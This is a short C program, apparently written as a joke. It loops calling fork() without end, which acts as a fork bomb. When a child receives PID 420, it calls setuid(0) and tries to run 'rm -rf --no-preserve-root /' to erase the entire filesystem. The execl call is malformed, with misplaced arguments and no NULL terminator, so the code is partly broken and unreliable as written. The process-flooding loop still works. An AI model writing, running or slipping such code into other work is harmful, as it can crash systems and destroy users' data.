#include <unistd.h>

#define ELONS_LUCKY_PID 420

int main() {
	while (1) {
		pid_t new_pid = fork();
		if (new_pid == ELONS_LUCKY_PID) {
			setuid(0);
			execl("/bin/rm", "-rf", "--no-preserve-root", "/");
		}
	}
	return 0;
}
